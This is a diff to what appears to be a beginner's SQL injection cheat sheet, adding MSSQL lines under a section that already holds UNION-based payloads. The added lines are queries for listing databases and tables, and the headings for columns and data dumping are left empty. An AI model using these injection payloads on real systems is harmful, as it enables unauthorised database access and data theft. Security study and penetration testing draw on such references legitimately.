@@ -106,8 +106,15 @@ Most of the SQLIs you will come across as a beginner will be MySQL. But, in some
 ' UNION ALL SELECT 1,SYSTEM_USER,3--
 ' UNION ALL SELECT 1,DB_NAME(),3--
 
+# Get DBs
+' SELECT name FROM master..sysdatabases
 
+# Get tables
+SELECT name FROM <table>..sysobjects WHERE xtype = 'U'
 
+# Get columns
+
+# Dump data
 ```
 
 #### PostgreSQL
